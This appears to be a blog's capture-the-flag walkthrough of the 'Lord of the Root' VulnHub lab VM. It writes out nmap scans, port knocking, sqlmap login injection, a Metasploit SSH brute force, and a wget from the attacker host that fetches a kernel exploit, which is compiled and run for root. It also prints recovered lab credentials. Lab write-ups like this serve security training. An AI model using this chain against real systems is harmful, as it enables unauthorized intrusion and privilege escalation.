@@ -1,0 +1,454 @@
+
+								
+																		Hack the Lord of the Root VM (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on November 6, 2016
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									This is another Boot2Root challenge which has been prepared by KoocSec for hacking exercises. He prepared this through the inspiration of his OSCP exam. It is based on the concepts of great novel-turned-movie The Lord Of The Ring.
+You can download this VM from –&gt; https://www.vulnhub.com/entry/lord-of-the-root-101,129/
+Breaching Methodology
+
+Network Scanning (Nmap)
+Port knocking
+Use robot.txt
+Login Form Based SQL Injection (Sqlmap)
+SSH brute force (Metasploit)
+Get into the shell for privilege escalation
+Import python one-liner for proper TTY shell
+Kernel Privilege Escalation
+Get Root access and capture the flag.
+
+Firstly, we will find our target.
+
+		
+		
+			
+			
+			
+			
+netdiscover
+			
+				
+					
+				
+					1
+				
+						netdiscover
+					
+				
+			
+		
+
+
+Our target is 192.168.1.101
+Now run the nmap script to know the ports and protocols.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A 192.168.1.101
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A 192.168.1.101
+					
+				
+			
+		
+
+
+Nmap has resulted in showing us that only 22 port is open with the service of SSH. Port 80 is not open that means we don’t have a facility of opening this server in the browser. Therefore we will try to see what port 22 has to offer and so go to your terminal in Kali and type:
+
+		
+		
+			
+			
+			
+			
+ssh 192.168.1.101 22
+			
+				
+					
+				
+					1
+				
+						ssh 192.168.1.101 22
+					
+				
+			
+		
+
+
+When I searched SSH it said “Knock Friend To Enter” and “Easy as 123” and then it asks for a password that we do not know yet. Now, this is hinting towards port knocking. Let’s try it:
+
+		
+		
+			
+			
+			
+			
+nmap -r -Pn –p 1,2,3 192.168.1.101
+			
+				
+					
+				
+					1
+				
+						nmap -r -Pn –p 1,2,3 192.168.1.101
+					
+				
+			
+		
+
+Now again fire up nmap scan. This time hopefully we will have more than one port in the result.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A 192.168.1.101
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A 192.168.1.101
+					
+				
+			
+		
+
+
+As you can see there is one more port open in comparison to our previous scan i.e. 1337 which has the service of HTTP and this is all we wanted as by default port 80 was not open. Let’s open our target IP with this port.
+
+		
+		
+			
+			
+			
+			
+192.168.1.101:1337
+			
+				
+					
+				
+					1
+				
+						192.168.1.101:1337
+					
+				
+			
+		
+
+
+It opens a page with only one image, as shown above, then we have also checked its source code but didn’t get any clue. Generally, there are always some chances of getting robots.txt file inside a web directory, therefore, while penetrating any system we should always check for the robots.txt file.
+Here we had tested for robots.txt it in url 192.168.1.101:1337/robots.txt, a new web page will following image gets opened.
+
+After then we looked into its source code and found base 64 encoded value.
+
+Further, we have decoded it twice in kali as shown below and found a directory from inside that. Let’s open it.
+
+And now we are face to face with a login portal. Now here I will try to log in with help of SQL injection and for that, we can use sqlmap.
+
+Since we don’t know the exact username and password, therefore, we have used SQLMAP for login form based injection for retrieving the database name and login credential by executing following command.
+
+		
+		
+			
+			
+			
+			
+sqlmap -u 'http://192.168.1.101:1337/978345210/index.php' --forms --dbs --risk=3 --level=5 --threads=4 --batch
+			
+				
+					
+				
+					1
+				
+						sqlmap -u 'http://192.168.1.101:1337/978345210/index.php' --forms --dbs --risk=3 --level=5 --threads=4 --batch
+					
+				
+			
+		
+
+
+And it will start gathering the database.
+
+And finally, it will show you the database of usernames and passwords.
+
+Moving on save all of these usernames and password in two different text files. And use this text files in an SSH log in attack with the help of Brute force method. And to execute this attack go to the terminal in Kali and open Metasploit by typing msfconsole and further type :
+
+		
+		
+			
+			
+			
+			
+use auxiliary/scanner/ssh/ssh_login
+msf exploit (scanner/ssh/ssh_login)&gt;set rhosts 192.168.1.101
+msf exploit (scanner/ssh/ssh_login)&gt;set user_file /root/Desktop/user.txt
+msf exploit (scanner/ssh/ssh_login)&gt;set pass_file /root/Desktop/pass.txt
+msf exploit (scanner/ssh/ssh_login)&gt; set stop_on_success true
+msf exploit (scanner/ssh/ssh_login)&gt;exploit
+			
+				
+					
+				
+					123456
+				
+						use auxiliary/scanner/ssh/ssh_loginmsf exploit (scanner/ssh/ssh_login)&gt;set rhosts 192.168.1.101msf exploit (scanner/ssh/ssh_login)&gt;set user_file /root/Desktop/user.txtmsf exploit (scanner/ssh/ssh_login)&gt;set pass_file /root/Desktop/pass.txtmsf exploit (scanner/ssh/ssh_login)&gt; set stop_on_success truemsf exploit (scanner/ssh/ssh_login)&gt;exploit
+					
+				
+			
+		
+
+And as a result, it will show you the correct username and password i.e. smeagol:MyPreciousR00t. Moreover, Metasploit serves you an additional benefit by providing a remote system command shell as unauthorized access into the victim’s system. Now start penetrating for accessing root privilege. Then to access proper TTY shell we had import python one line script by typing following:
+
+		
+		
+			
+			
+			
+			
+python -c 'import pty;pty.spawn("/bin/bash")'
+			
+				
+					
+				
+					1
+				
+						python -c 'import pty;pty.spawn("/bin/bash")'
+					
+				
+			
+		
+
+Now you will reach the terminal. Here, type the following command to know the version of the kernel:
+
+		
+		
+			
+			
+			
+			
+lsb_release -a
+			
+				
+					
+				
+					1
+				
+						lsb_release -a
+					
+				
+			
+		
+
+
+The version is 14.04 and luckily we have an exploit for this version. In the Kali terminal lets the search for the appropriate exploit and for this type:
+
+		
+		
+			
+			
+			
+			
+searchsploit ubuntu 14.04
+			
+				
+					
+				
+					1
+				
+						searchsploit ubuntu 14.04
+					
+				
+			
+		
+
+
+Copy the exploit on the desktop with help of cp command and run HTTP python server for transferring it into the target’s machine.
+
+First, we need to f download the exploit and compile it and for this type:
+
+		
+		
+			
+			
+			
+			
+wget http://192.168.1.108/39166.c
+gcc 39166.c -o shell
+			
+				
+					
+				
+					12
+				
+						wget http://192.168.1.108/39166.cgcc 39166.c -o shell
+					
+				
+			
+		
+
+The first command in the above commands will download the exploit and the second one will compile it and save it in the file named shell. Next, we have to give permission to the shell and then, at last, we have to run it.
+
+		
+		
+			
+			
+			
+			
+chmod 777 shell
+./shell
+			
+				
+					
+				
+					12
+				
+						chmod 777 shell./shell
+					
+				
+			
+		
+
+Now let’s get into the root folder and see what it has to offer:
+
+		
+		
+			
+			
+			
+			
+cd /root
+ls
+			
+				
+					
+				
+					12
+				
+						cd /rootls
+					
+				
+			
+		
+
+Here, we have found a text file with the name flag which was our ultimate goal. So now no more waiting lets read it.
+
+		
+		
+			
+			
+			
+			
+cat Flag.txt
+			
+				
+					
+				
+					1
+				
+						cat Flag.txt
+					
+				
+			
+		
+
+
+Author: Yashika Dhir is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
